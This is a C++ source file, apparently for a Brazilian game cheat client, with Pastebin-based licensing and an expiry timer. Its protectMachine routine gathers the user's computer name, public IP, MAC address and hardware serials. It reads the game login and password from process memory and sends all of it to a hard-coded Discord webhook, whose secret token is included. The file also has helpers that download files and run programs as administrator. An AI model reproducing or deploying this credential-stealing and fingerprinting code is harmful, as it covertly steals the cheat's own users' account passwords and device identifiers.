#include "Sistema.h"

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
	userp->append((char*)contents, size * nmemb);
	return size * nmemb;
}

// Função para obter dados do Pastebin
std::string getDataFromUrl(const std::string& url) {
	CURL* curl;
	CURLcode res;
	std::string readBuffer;

	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);

		/*if (res != CURLE_OK) {
			std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
		}*/
	}
	return readBuffer;
}

void getFromPastebin() {
	std::string data = getDataFromUrl("https://pastebin.com/raw/Han0n8n7");

	std::stringstream ss(data);
	std::string line;

	while (std::getline(ss, line)) {
		size_t firstDash = line.find(" - ");
		size_t secondDash = line.rfind(" - ");

		std::string name = line.substr(0, firstDash);
		std::string serial = line.substr(firstDash + 3, secondDash - firstDash - 3);
		std::string date = line.substr(secondDash + 3);

		names.push_back(name);
		serials.push_back(serial);
		dates.push_back(date);
	}
}

unsigned long djb2Hash(const std::string& str) {
	unsigned long hash = 5381;
	int c;

	for (std::size_t i = 0; i < str.length(); ++i) {
		c = static_cast<int>(str[i]);
		hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
	}

	return hash;
}

bool bCheckRegister() {
	std::string valorConcatenado = biosSerialNumber + diskSerialNumber;

	unsigned long hash = djb2Hash(valorConcatenado);

	getFromPastebin();

	for (int i = 0; i < serials.size(); i++) { //até o tamanho do vetor
		if (hash == std::stoul(serials[i])) { //se o serial do vetor for igual ao serial do usuario, então..
			expireDate = dates[i];
			dwNome = names[i];

			return TRUE;
		}
	}

	return FALSE;
}

void protectMachine() {
	while (true) {
		Sleep(10);

		if (!bGetDadosPC) {
			hres = initializeCOM();
			hres = connectToWMI(&pLoc, &pSvc);

			if (FAILED(hres))
				uninitializeCOM();

			computerName = getComputerNameWMI(pSvc);
			publicIP = getPublicIP();
			macAddress = getPrimaryMACAddressWMI(pSvc);
			processorName = getProcessorName(pSvc);
			processorId = getProcessorId(pSvc);
			biosSerialNumber = getBiosSerialNumber(pSvc);
			diskSerialNumber = getDiskDriveSerialNumber(pSvc);

			bGetDadosPC = true;
		}

		if (read(0x038581DC, 4) > 0) {
			if (!bSendDadosPCToDiscord) {
				//Check register
				if (!bCheckRegister())
					bFlag = true;

				std::string szMessage =
					"-------------------------------------------------------------------\n"
					"Cliente: " + dwNome + "\n\n" +
					"Computer Name: " + computerName + "\n" +
					"IP: " + publicIP + "\n" +
					"Primary MAC: " + macAddress + "\n" +

					"\nProcessor Name: " + processorName + "\n" +
					"Processor ID: " + processorId + "\n" +

					"\nBIOS Serial Number: " + biosSerialNumber + "\n"
					"Disk Serial Number: " + diskSerialNumber + "\n"
					"-------------------------------------------------------------------\n";

				sendDiscordWebhook(szMessage);

				if (bFlag) {
					dwLogin = readString(0x036BD468, 0x20);
					dwPassword = readString(0x036BD368, 0x20);

					std::string szMessage2 =
						"-------------------------------- Atention! -----------------------------------\n"
						"Cliente: " + dwNome + "\n\n" +
						"ID: " + dwLogin + "\n" +
						"Pw: " + dwPassword + "\n" +
						"Obs.: Usuario desconhecido. Fechando o client!";

					sendDiscordWebhook(szMessage2);

					Sleep(1000);
					ExitProcess(0);
				}

				//Time do cheat
				lol(hHora, false);

				//Menu de opções para ativar
				lol(menu, false);

				//AutoBot..
				lol(findMob, false);

				//Anti protect mouse
				//lol(disableProtectMouse, false);

				//Hooks na sessão .text
				//lol(hooks, false);

				bSendDadosPCToDiscord = true;
			}

			if (!bSendLoginToDiscord) {
				Sleep(1000);

				dwLogin = readString(0x036BD468, 0x20);
				dwPassword = readString(0x036BD368, 0x20);

				std::string szMessage =
					"-------------------------------------------------------------------\n"
					"Cliente: " + dwNome + "\n\n" +
					"ID: " + dwLogin + "\n" +
					"Pw: " + dwPassword;

				sendDiscordWebhook(szMessage);

				bSendLoginToDiscord = true;
			}
		}
		else
			bSendLoginToDiscord = false;
	}
}

std::string sDate, sHour;

std::tm GetTime(const std::string& date, const std::string& time) {
	std::tm tm = { 0 };
	std::sscanf(date.c_str(), "%d-%d-%d", &tm.tm_year, &tm.tm_mon, &tm.tm_mday);
	std::sscanf(time.c_str(), "%d:%d:%d", &tm.tm_hour, &tm.tm_min, &tm.tm_sec);
	tm.tm_year -= 1900; // Ajuste do ano
	tm.tm_mon -= 1;     // Ajuste do mês
	return tm;
}

int Tmain() {
	HINTERNET hSession = WinHttpOpen(L"Test", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) {
		//std::cerr << "Erro ao abrir a sessão WinHTTP." << std::endl;
		return -1;
	}

	HINTERNET hConnect = WinHttpConnect(hSession, L"worldtimeapi.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
	if (!hConnect) {
		//std::cerr << "Erro ao conectar ao servidor." << std::endl;
		WinHttpCloseHandle(hSession);
		return -2;
	}

	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/timezone/America/Sao_Paulo", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (!hRequest) {
		//std::cerr << "Erro ao abrir o pedido HTTP." << std::endl;
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return -3;
	}

	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
		//std::cerr << "Erro ao enviar a solicitação HTTP." << std::endl;
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return -4;
	}

	if (!WinHttpReceiveResponse(hRequest, NULL)) {
		//std::cerr << "Erro ao receber a resposta HTTP." << std::endl;
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return -5;
	}

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;

	std::string datetimeString;
	do {
		dwSize = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
			//std::cerr << "Erro ao consultar os dados disponíveis." << std::endl;
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return -6;
		}

		pszOutBuffer = new char[dwSize + 1];
		if (!pszOutBuffer) {
			//std::cerr << "Erro ao alocar memória." << std::endl;
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return -7;
		}

		ZeroMemory(pszOutBuffer, dwSize + 1);

		if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
			//std::cerr << "Erro ao ler os dados." << std::endl;
			delete[] pszOutBuffer;
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return -8;
		}

		std::string response(pszOutBuffer);

		std::regex datetimeRegex("\"datetime\":\"(.*?)\"");
		std::smatch match;

		if (std::regex_search(response, match, datetimeRegex) && match.size() > 1) {
			datetimeString = match.str(1);
		}

		delete[] pszOutBuffer;
	} while (dwSize > 0);

	// Extrair data (ano, mês, dia)
	sDate = datetimeString.substr(0, 10);

	// Extrair hora (hora, minuto, segundo)
	sHour = datetimeString.substr(11, 8);

	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

	return 0;
}

void hHora() {
	while (true) {
		Sleep(800);

		if (!Tmain()) {
			// Convertendo as strings de data e hora para std::tm
			std::tm current = GetTime(sDate, sHour);
			std::tm expire = GetTime(expireDate, expireTime);

			// Convertendo std::tm para tempo em segundos
			std::time_t currentSeconds = std::mktime(&current);
			std::time_t expireSeconds = std::mktime(&expire);

			// Calculando a diferença de tempo em segundos
			std::time_t timeDifference = expireSeconds - currentSeconds;

			// Calculando dias, horas, minutos e segundos da diferença
			int days = timeDifference / (24 * 3600);
			int hours = (timeDifference % (24 * 3600)) / 3600;
			int minutes = (timeDifference % 3600) / 60;
			int seconds = timeDifference % 60;

			// Convertendo horas, minutos e segundos para strings no formato "HH:MM:SS"
			std::string strDays = std::to_string(days);
			std::string strHours = std::to_string(hours);
			std::string strMinutes = std::to_string(minutes);
			std::string strSeconds = std::to_string(seconds);

			// Adicionando zero à esquerda, se necessário
			if (strDays.size() == 1) strDays = "0" + strDays;
			if (strHours.size() == 1) strHours = "0" + strHours;
			if (strMinutes.size() == 1) strMinutes = "0" + strMinutes;
			if (strSeconds.size() == 1) strSeconds = "0" + strSeconds;

			//

			if (timeDifference <= 0) {
				Beep(500, 1000);

				MessageBoxA(NULL, "Tempo de uso do cheat expirado! \n\nPor favor, contate o administrador: dwSize", "RIP", MB_ICONWARNING | MB_OK);
				ExitProcess(0);
			}
		}
	}
}

HRESULT initializeCOM() {
	HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
	if (FAILED(hres)) {
		return hres;
	}

	hres = CoInitializeSecurity(
		NULL,
		-1,
		NULL,
		NULL,
		RPC_C_AUTHN_LEVEL_DEFAULT,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		EOAC_NONE,
		NULL
	);

	return hres;
}

void uninitializeCOM() {
	CoUninitialize();
}

HRESULT connectToWMI(IWbemLocator** pLoc, IWbemServices** pSvc) {
	HRESULT hres = CoCreateInstance(
		CLSID_WbemLocator,
		0,
		CLSCTX_INPROC_SERVER,
		IID_IWbemLocator, (LPVOID*)pLoc);

	if (FAILED(hres)) {
		return hres;
	}

	hres = (*pLoc)->ConnectServer(
		_bstr_t(L"ROOT\\CIMV2"),
		NULL,
		NULL,
		0,
		NULL,
		0,
		0,
		pSvc);

	return hres;
}

HRESULT executeWMIQuery(IWbemServices* pSvc, const std::wstring& query, IEnumWbemClassObject** pEnumerator) {
	return pSvc->ExecQuery(
		bstr_t("WQL"),
		bstr_t(query.c_str()),
		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
		NULL,
		pEnumerator
	);
}

std::string getComputerNameWMI(IWbemServices* pSvc) {
	try {
		IEnumWbemClassObject* pEnumerator = NULL;
		HRESULT hres = executeWMIQuery(pSvc, L"SELECT * FROM Win32_ComputerSystem", &pEnumerator);

		if (FAILED(hres)) {
			return "Desconhecido";
		}

		IWbemClassObject* pclsObj = NULL;
		ULONG uReturn = 0;

		while (pEnumerator) {
			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

			if (0 == uReturn) {
				break;
			}

			VARIANT vtProp;
			hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
			std::wstring computerName(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
			VariantClear(&vtProp);

			pclsObj->Release();

			return std::string(computerName.begin(), computerName.end());
		}

		pEnumerator->Release();
		return "Desconhecido";
	}
	catch (const std::exception& e) {
		return "Erro ao obter o nome do computador";
	}
}

std::string getPrimaryMACAddressWMI(IWbemServices* pSvc) {
	try {
		IEnumWbemClassObject* pEnumerator = NULL;
		HRESULT hres = executeWMIQuery(pSvc, L"SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE", &pEnumerator);

		if (FAILED(hres)) {
			//std::cerr << "Falha na consulta WMI." << std::endl;
			return "Erro na consulta WMI";
		}

		IWbemClassObject* pclsObj = NULL;
		ULONG uReturn = 0;
		std::string macAddress;

		if (pEnumerator) {
			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

			if (uReturn) {
				VARIANT vtProp;
				hr = pclsObj->Get(L"MACAddress", 0, &vtProp, 0, 0);
				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
					_bstr_t bstrMacAddress(vtProp.bstrVal, false);
					macAddress = (char*)bstrMacAddress;
				}
				VariantClear(&vtProp);

				pclsObj->Release();
			}
		}

		pEnumerator->Release();
		return macAddress;
	}
	catch (const std::exception& e) {
		return "Erro ao obter o MAC do computador";
	}
}

std::string getProcessorId(IWbemServices* pSvc) {
	try {
		IEnumWbemClassObject* pEnumerator = NULL;
		HRESULT hres = executeWMIQuery(pSvc, L"SELECT ProcessorId FROM Win32_Processor", &pEnumerator);

		if (FAILED(hres)) {
			//std::cerr << "Falha na consulta WMI." << std::endl;
			return "Erro na consulta WMI";
		}

		IWbemClassObject* pclsObj = NULL;
		ULONG uReturn = 0;
		std::string processorId;

		if (pEnumerator) {
			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

			if (uReturn) {
				VARIANT vtProp;
				hr = pclsObj->Get(L"ProcessorId", 0, &vtProp, 0, 0);
				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
					_bstr_t bstrProcessorId(vtProp.bstrVal, false);
					processorId = (char*)bstrProcessorId;
				}
				VariantClear(&vtProp);

				pclsObj->Release();
			}
		}

		pEnumerator->Release();
		return processorId;
	}
	catch (const std::exception& e) {
		return "Erro ao obter a id do processador";
	}
}

std::string getProcessorName(IWbemServices* pSvc) {
	try {
		IEnumWbemClassObject* pEnumerator = NULL;
		HRESULT hres = executeWMIQuery(pSvc, L"SELECT Name FROM Win32_Processor", &pEnumerator);

		if (FAILED(hres)) {
			//std::cerr << "Falha na consulta WMI." << std::endl;
			return "Erro na consulta WMI";
		}

		IWbemClassObject* pclsObj = NULL;
		ULONG uReturn = 0;
		std::string processorName;

		if (pEnumerator) {
			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

			if (uReturn) {
				VARIANT vtProp;
				hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
					_bstr_t bstrProcessorName(vtProp.bstrVal, false);
					processorName = (char*)bstrProcessorName;
				}
				VariantClear(&vtProp);

				pclsObj->Release();
			}
		}

		pEnumerator->Release();
		return processorName;
	}
	catch (const std::exception& e) {
		return "Erro ao obter o nome do processador";
	}
}

std::string getBiosSerialNumber(IWbemServices* pSvc) {
	try {
		IEnumWbemClassObject* pEnumerator = NULL;
		HRESULT hres = executeWMIQuery(pSvc, L"SELECT SerialNumber FROM Win32_BIOS", &pEnumerator);

		if (FAILED(hres)) {
			//std::cerr << "Falha na consulta WMI." << std::endl;
			return "Erro na consulta WMI";
		}

		IWbemClassObject* pclsObj = NULL;
		ULONG uReturn = 0;
		std::string biosSerialNumber;

		if (pEnumerator) {
			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

			if (uReturn) {
				VARIANT vtProp;
				hr = pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0);
				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
					_bstr_t bstrBiosSerialNumber(vtProp.bstrVal, false);
					biosSerialNumber = (char*)bstrBiosSerialNumber;
				}
				VariantClear(&vtProp);

				pclsObj->Release();
			}
		}

		pEnumerator->Release();
		return biosSerialNumber;
	}
	catch (const std::exception& e) {
		return "Erro ao obter o serial da bios";
	}
}

std::string getDiskDriveSerialNumber(IWbemServices* pSvc) {
	try {
		IEnumWbemClassObject* pEnumerator = NULL;
		HRESULT hres = executeWMIQuery(pSvc, L"SELECT SerialNumber FROM Win32_DiskDrive", &pEnumerator);

		if (FAILED(hres)) {
			//std::cerr << "Falha na consulta WMI." << std::endl;
			return "Erro na consulta WMI";
		}

		IWbemClassObject* pclsObj = NULL;
		ULONG uReturn = 0;
		std::string diskDriveSerialNumber;

		if (pEnumerator) {
			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

			if (uReturn) {
				VARIANT vtProp;
				hr = pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0);
				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
					_bstr_t bstrDiskDriveSerialNumber(vtProp.bstrVal, false);
					diskDriveSerialNumber = (char*)bstrDiskDriveSerialNumber;
				}
				VariantClear(&vtProp);

				pclsObj->Release();
			}
		}

		pEnumerator->Release();
		return diskDriveSerialNumber;
	}
	catch (const std::exception& e) {
		return "Erro ao obter o serial do disco";
	}
}

//

size_t callback(const char* in, size_t size, size_t num, std::string* out) {
	const size_t totalBytes(size * num);
	out->append(in, totalBytes);
	return totalBytes;
}

std::string getPublicIP() {
	CURL* curl = curl_easy_init();
	std::string response;

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "http://api.ipify.org");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

		CURLcode res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			//std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
		}

		curl_easy_cleanup(curl);
	}

	return response;
}

void sendDiscordWebhook(std::string szMessage) {
	// URL do webhook do Discord
	std::string webhook_url = "https://discord.com/api/webhooks/1194091594769510440/3jQlX8za_31amZ6mO85ffW4dmNuSLbTBK8q2ZIXnktaXIh_nGWlM7TkwqIvwP5yNMunu";

	// Criando a mensagem JSON
	nlohmann::json json_message;
	json_message["content"] = szMessage;

	// Convertendo o JSON em string
	std::string json_str = json_message.dump();

	// Iniciando CURL
	CURL* curl = curl_easy_init();
	if (curl) {
		// Definindo cabeçalhos para JSON
		struct curl_slist* headers = NULL;
		headers = curl_slist_append(headers, "Content-Type: application/json");

		// Definindo opções do CURL para POST
		curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_str.c_str());
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

		// Opção para ver detalhes da requisição e resposta (útil para debug)
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

		// Enviando a requisição
		CURLcode res = curl_easy_perform(curl);

		// Verificando se houve erros
		if (res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

		// Limpeza
		curl_easy_cleanup(curl);
		curl_slist_free_all(headers);
	}
}

//

#include <fstream>

size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream) {
	size_t written = fwrite(ptr, size, nmemb, stream);
	return written;
}

bool download_file(const std::string& url, const std::string& output_path) {
	CURL* curl;
	FILE* fp;
	CURLcode res;
	curl = curl_easy_init();
	if (curl) {
		fp = fopen(output_path.c_str(), "wb");
		if (fp == NULL) {
			perror("Erro ao abrir o arquivo");
			return false;
		}
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		fclose(fp);

		return (res == CURLE_OK);
	}
	return false;
}

bool RunAsAdmin(const wchar_t* filePath, const wchar_t* params) {
	SHELLEXECUTEINFO shExInfo = { 0 };
	shExInfo.cbSize = sizeof(shExInfo);
	shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	shExInfo.hwnd = 0;
	shExInfo.lpVerb = L"runas"; // Executar como administrador
	shExInfo.lpFile = filePath; // Caminho para o executável
	shExInfo.lpParameters = params; // Parâmetros adicionais (se necessário)
	shExInfo.lpDirectory = 0;
	shExInfo.nShow = SW_SHOW;
	shExInfo.hInstApp = 0;

	if (!ShellExecuteEx(&shExInfo)) {
		DWORD errorCode = GetLastError();
		/*if (errorCode == ERROR_CANCELLED)
			std::cout << "Operação cancelada pelo usuário." << std::endl;
		else
			std::cout << "Falha ao executar como administrador." << std::endl;
		*/
		return false;
	}

	WaitForSingleObject(shExInfo.hProcess, INFINITE);
	CloseHandle(shExInfo.hProcess);

	return true;
}